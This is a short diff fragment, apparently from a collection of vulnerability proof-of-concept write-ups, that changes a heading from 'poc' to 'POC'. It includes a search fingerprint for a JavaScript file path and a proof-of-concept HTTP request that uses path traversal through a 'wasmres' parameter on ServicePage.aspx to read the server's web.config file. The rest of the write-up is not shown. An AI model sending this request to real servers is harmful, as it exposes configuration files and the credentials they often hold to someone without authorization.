@@ -8,7 +8,7 @@
 body="/emis_lib/js/ThreeExtras.js"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /dcwriter/thirdpart/ServicePage.aspx?wasmres=./../web.config HTTP/1.1
